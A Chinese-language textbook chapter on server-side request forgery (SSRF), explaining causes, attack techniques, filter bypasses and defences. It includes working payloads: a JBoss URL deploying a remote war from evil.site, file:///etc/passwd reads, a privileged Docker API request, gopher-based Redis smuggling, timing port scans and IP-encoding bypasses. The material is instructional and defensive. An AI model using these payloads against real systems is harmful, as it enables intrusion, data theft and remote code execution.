# 第十二章
# 服务端请求伪造(SSRF)
## SSRF攻击简介
如果web应用会将外部输入的参数作为URL，然后访问这个URL，那么攻击者就可以构造特定的参数值，让服务端访问指定的URL，该访问行为是服务器预期之外的，这种攻击叫SSRF攻击，web应用中的该漏洞称为SSRF漏洞。这里输入的参数值不一定是完整的URL，也可以是域名、IP地址、端口值等。
如，有些提供翻译服务的网站允许用户提交一个网页的URL，然后对整个网页进行翻译，再返回翻译后的结果：
```
<?php
$content = file_get_contents($_GET['url]);
echo translate($content);
?>
```
由于服务端的翻译引擎必须访问网页的URL获取原始内容，如果攻击者构造特定的URL，就可以让服务端作为代理去访问它，并获得访问结果。
类似的场景还有很多，比如：web应用需要调用不同的外部接口，让客户端提交接口的地址；在一些允许用户提交一个图片URL作为头像的应用中，web应用需要拉取这个图片并裁剪，这些场景中都可能产生SSRF漏洞。
web应用一般都有自己的内网环境，它与外网是隔离的，攻击者无法直接访问内网服务，但是通过web应用的SSRF漏洞，攻击者可以访问内网服务或者对内网应用发起攻击，这是最常见的SSRF攻击方式。如：
`/translate.php?url=http://192.168.1.100:8080/`
此攻击和远程文件包含有点像，只不过远程文件包含指的是服务端应用加载和执行远程脚本，实际上远程文件包含漏洞也是SSRF漏洞。此外，存在SSRF漏洞的应用如果使用file://协议攻击者也能读取服务器上的本地文件，从而导致敏感信息泄漏，比如：
`translate.php?url=file:///etc/passwd`
在PHP中除了file_get_contents()函数，其他的网络库也能产生SSRF漏洞，如fsockopen()和cURL库。下面是一个使用cURL库的例子：  
```
<?php
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL,$_GET['url']);
$content = curl_exec($curl);
curl_close($curl);
echo translate($content);
?>
```
cURL库支持更多的协议类型，利用它可以实现更复杂的SSRF攻击。
在这种访问会返回URL页面的场景下，我们可以尝试构造特定的URL参数来探测Web应用是否存在SSRF漏洞。比如，对于常见的参数像url、src、link等参数，我们设置其值为"https://www.baidu.com"，如果返回的内容中含有百度首页源码特征，就说明存在SSRF漏洞。有些场景中，web应用并不会返回访问URL的内容哦。这种情况下，我们需要使用自己搭建的服务器作为目标的URL，通过查看服务器访问日志或通过使用DNS服务器日志的方式(与SQL盲注中的带外数据一样)，来判定或探测是否存在SSRF漏洞，称为"SSRF盲打"。互联网上有现成的DNSlog平台可以使用。
通常，开发人员将应用放在内网是比较安全的，所以很多内网应用没有安全防护措施，比如缺少认证授权，或者使用了版本很低的带有漏洞的中间件。其实，攻击者通过SSRF漏洞就能够绕过边界防护，从外网利用带有SSRF漏洞的应用，以此作为跳板攻击内网应用。
## SSRF漏洞成因
web应用中除了显式地外部输入URL，还有很多中原因可能产生SSRF漏洞。常见的SSRF漏洞成因有以下几种：
1、web应用使用网络库获取外部资源或调用外部接口
2、问价解析库产生网络请求。如，解析存在外部实体(XXE)的XML文件，将会发起网络请求，部分Office文档库在解析时也会发起网络请求。
3、应用程序允许通过外部参数指定配置，如通过外部参数传入数据库连接地址、通过外部输入参数来指定LDAP参数。
4、使用了无头浏览器(Headless Browser)。比如，Phantomjs和Selenium经常被用于渲染网页，然后检测或抓取网页的内容，用它们可以加载指定的URL，或者在网页中嵌入指定的URL资源，如果没有相应的参数过滤或者网络隔离措施，则可能产生SSRF漏洞。在爬虫场景中比较常见，攻击者可以构造恶意的网页，当其被爬取渲染后，就能实现SSRF攻击。
5、应用程序的后端在执行安全检测时发起了网络访问。如果即时通信软件或邮件系统提供了网址安全检测的功能，用于防止用户发送链接中包含钓鱼页面，违法内容等，服务端的内容检测引擎就会访问用户发送的URL以进行安全检测，在这个场景中也会发生SSRF攻击。
## SSRF攻击进阶
攻击者通过巧妙地构造数据，还能攻击其他类型的应用
### 攻击内网应用
大部分场景下，存在SSRF漏洞的应用只可以使用HTTP/HTTPS协议发起请求，而且通常限制了请求的方法。但是，攻击者仅利用这一点就能攻击很多带有漏洞的内网应用。例如，Structs2有多个远程代码执行漏洞只需要一个GET请求就能实现。而且很多中间件的管理控制台在内网是开放的，甚至无密码登录。例如JBoss的JMX-Console通常不会对外网开放，并且未授权就能访问，如果构造如下URL实施SSRF攻击就能让服务器部署一个远程的恶意应用：
```
http://localhost:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://evil.site/shell.war
```
类似的提供HTTP接口的服务非常多，比如MongoDB、Docker、ElasticSearch、Jenkins、Tomcat等它们都可能存在未授权访问，可导致敏感数据泄漏或者远程代码执行。比如，可以通过HTTP接口访问CurDB中的数据，通过如下URL就能访问用户列表的所有数据：
`http://localhost:5984/_users/_all_docs`
通过SSRF漏洞访问Docker的API可以运行任何镜像，相当于运行任意程序，例如：
```
POST /containers/create?name=test HTTP/1.1
Host:website.com
Content-Type:application/json
...
{"Image":"image_name","Cmd":["/usr/bin/some_command"],"Binds":["/:/mnt"],"Privileged":true}
```
所以，SSRF漏洞就像是外网访问内网的代理服务器，将内网的哪些防护措施不完善的应用暴露在攻击者面前
### 端口扫描
通过SSRF漏洞，攻击者可以探测内网域名或IP地址是否存在，端口是否开放。
如果服务端会返回错误信息，攻击者就可以很方便的探测这些信息。比如，能通过返回信息判断域名和端口是否存在和开放：
`curl 'http://example.com/translate.php?url=http:wiki.example.com'
curl 'http://example.com/translate.php?url=http:1227.0.0.1:80'`
但是更多的时候服务端不会返回错误信息，或者所有的错误提示都是一样的，这时攻击者可能会使用其他手段来探测。比如，尝试找出访问不同端口时服务器响应的差异，比如响应内容的长度、状态码、响应时间等信息。下面的代码尝试多次访问不同的端口，通过响应时间的差异来判断端口开放情况：
`time (for i in {1..100}; do curl 'http://example.com/translate.php?url=https://127.0.0.1:22/';done)`
通过对比不同请求的响应时间，就可以得出，端口的开放情况。在延迟较大的互联网上，可能需要探测多次，根据统计数据就能判断端口开放的情况。这种攻击属于侧信道攻击(Side Channel Attack)
另外，不同协议的客户端和服务端的数据交互机制不一样，换一种协议可能会拉开响应时间的差距。比如在上例中该用FTP协议去探测，开放和关闭的端口的响应时间就有非常大的差异：
`time (for i in {1..100}; do curl 'http://example.com/translate.php?url=ftp://127.0.0.1:22/';done)`
在HTTPS协议中要尝试建立加密连接，在端口开放的情况下，其通常比在HTTP协议中的耗时稍微长点，但是探测效果更好。
### 攻击非web应用
在绝大多数SSRF攻击中，应用程序原本的设计是通过HTTP/HTTPS协议去访问其他URL，但是如果整个URL都是外部输入的参数控制的，那么攻击者可以尝试使用其他协议来访问其他非web应用。最基本的方法是使用file://协议来访问服务器本地文件系统，比如：
`http:example.com/vuln.php?url=file:///etc/passwd`
此外，还有很多HTTP库都支持HTTP协议以外的其他协议，如LDAP、FTP、Gopher、DICT、IMAP、POP3、SMTP、Telnet等协议，攻击者可以在SSRF攻击中使用这些协议就能访问更多不同类型的应用。下面的SSRF攻击就让web应用访问了内网的FTP服务：
`http://example.com/vuln.php?url=ftp://10.100.1.1/data.zip`
攻击者可以在自己的外网服务器上监听一个端口，将目标URL指向自己的服务器，然后使用不同的协议逐个尝试，就能收集到该SSRF漏洞支持的协议类型.
其中对攻击者最有利的是DICT和Gopher协议，基于它们可以实现一种称为"协议走私(Protocol Smuggling)"的效果，也叫"协议夹带"。所谓协议走私，是指一个应用协议的数据只能够注入另一种应用协议的数据，当攻击者使用一种应用协议发送请求时，如果精心构造请求的内容，就能使之同时满足另一种应用协议的数据格式要求。
当存在SSRF漏洞的应用支持一种比较原始简单的应用协议时(近似原始的TCP协议)，就更容易被注入其他协议，从而实现协议走私。比如，Gopher就是一种"万金油"协议，其格式如下：
`gopher://<host>:<port>/<gophertype><selecttor>`
其中gophertype是一个字符的资源类型标识，后面的selector会被直接发送给服务端，可以夹带很多其他协议的类型。
`curl gopher://localhost/1helllo%20world`
所以，Gopher协议近似原始的TCP协议，攻击者可以任意填充selector部分的内容，通过进行构造的selector的内容，可以夹带很多其他类型的协议。
在SSRF攻击中，如果攻击者直接使用HTTP协议的URL，就只能控制URL而没有办法控制HTTP 请求中的其他字段，能攻击的应用就比较有限。但是如果攻击者能够自己构造HTTP请求内容，然后通过Gopher协议发送，就可以指定任意HTTP请求的Method、Header、Body等内容，这样就能有更大的攻击范围。例如：
`gopher;//localhost:8080/1POST%20/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0%0asomedatahere`
通过Gopher协议还能访问更多类似的无须握手过程的服务，例如Redis服务--只需要建立TCP连接后直接发送指令就能实现。在Gopher协议中夹带Rediscover协议：
`curl gopher://localhost:6379/1set%20mykey%20hello`
`curl gopher://localhost:6379/1get%20mykey`
Redis通常不开放给公网访问，默认是不开启身份认证的。如果web应用存在SSRF漏洞，攻击者就可以利用SSRF漏洞通过Gopher协议的URL攻击内网的Redis，比如恶意篡改应用中的关键数据。此外，Redis还存在多种提权的方式，比如先存入一段恶意数据，再通过SAVE指令写入文件，从而实现写入SSH公钥、添加crontab定时任务、写入webshell等功能。
此外，攻击内网的FastCGI、Memcahed也是常用的SSRF攻击利用方式。但是Gopher协议无法实现交互，在一些复杂的协议场景中会受到限制，比如采用了TLS的应用协议，这种方式是没办法夹带数据完成TLS握手的，也不可能实施攻击。
除了Gopher，DICT和LDAP协议也能实现类似的协议走私效果。下面的Python代码使用的是LDAP协议，通过构造特定的参数值，该LDAP访问其实是往本地Redis服务中添加了一个键值对，如果应用允许用户输入host、port、dn等字段，将会发生SSRF攻击：
```
import ldap

host = 'localhost'
port = 6379
dn = '\nSET mykey hello\n'

conn = ldap.initialize('ldap://{}:{}'.format(host,port));
conn.simple_bind_s(dn,pwd) 
```
近几年，SSRF攻击的很多巧妙的方式被发现，其影响范围远超内网的HTTP伪造请求。
### 绕过技巧
因为SSRF通常被用来攻击内网应用，所以不少开发者针对SSRF漏洞做的防御方案，只是简单地限制URL中的地址不允许为内网域名或者内网IP地址。但是很多HTTP库会跟随HTTP跳转，因此前述防御方案就可以通过非常简单的跳转方式绕过。攻击者在自己的域名evil.site中放一个redirect.php文件，其作用就是跳转到一个内网地址：
```
<?php
header("Location:http://localhost:8080");
?>
```
使用http://evil.site/redirect.php就可以绕过服务端的内网域名限制。另外，有很多短网址服务可以更方便地实现这个操作，但是前提是应用中的HTTP库支持跟随跳转。
使用一个伪造的域名也能轻易地绕过黑名单检测。比如攻击者申请一个域名evil.site，修改它的A记录(A记录是一种DNS资源记录类型，用于将域名映射到IPv4地址)，解析到127.0.0.1，也可以通过SSRF攻击访问服务器本身。
此外，互联网上有一些泛域名支持解析到任意IP地址，比如任意形如"x.a.b.c.d.nip.io"的域名都会被解析到IP地址a.b.c.d，如果web应用中把内网域名作为黑名单，这种泛域名就可很方便派上用场：
`nslookup laowang.192.168.56.101.nip.io`
如果开发者使用正则表达式来校验域名是否在白名单中，当正则表达式写得不够严谨时，可能存在绕过。例如，下面几个URL都是在访问evil.site网站：
```
http://example.comf@evil.site/
http://evil.site/example.com/
http://evil.site#example.com/
```
即使应用校验了IP黑名单，如果考虑不周全，也会存在绕过。如：下面几个URL都是在访问http://127.0.0.1:8080/
```
http://localhost:8080/
http://127.0.0.1:8080/
http://2130706433:8080/
http://0.0.0.0:8080/
http://01770000001:8080/
http://127.127.127.127:8080/
```
## SSRF防御方案
SSRF漏洞并没有固定的防御方案，要根据实际的场景选择合适的方案但是开发者应当尽量避免使用黑名单来限制URL，而是采用白名单方式。如下安全建议可供参考 ：
1、校验协议类型，使用白名单，允许指定协议访问
2、如果应用调用接口有限，应当使用白名单URL方式。限制能访问指定的URL，域名和IP的匹配规则要写得严谨，避免绕过。
3、允许任意用户填写域名或IP，如果输入的是IP则校验IP是否为公网IP，输入的是域名，则通过DNS解析得到其IP地址，再校验IP地址是否为公网IP。
4、使用成熟的URL解析库来解析需要提取协议、主机、端口、路径等信息，不要手写
5、对输入的参数做安全校验。如很多协议走私的攻击中都要用到CRLF，在上面的LDAP协议走私案例中，如果过滤掉dn、passwd字段的非法字符就能阻止攻击发生。最好使用白名单。
6、大部分应用中使用的HTTP库支持HTTP/HTTPS协议就够了，应当禁用其他协议
7、内网应用进行认证和授权，这样限制攻击者通过漏洞进行横向移动
8、web服务器过滤掉预期之外的返回信息，并将其记录到日志方便分析排查。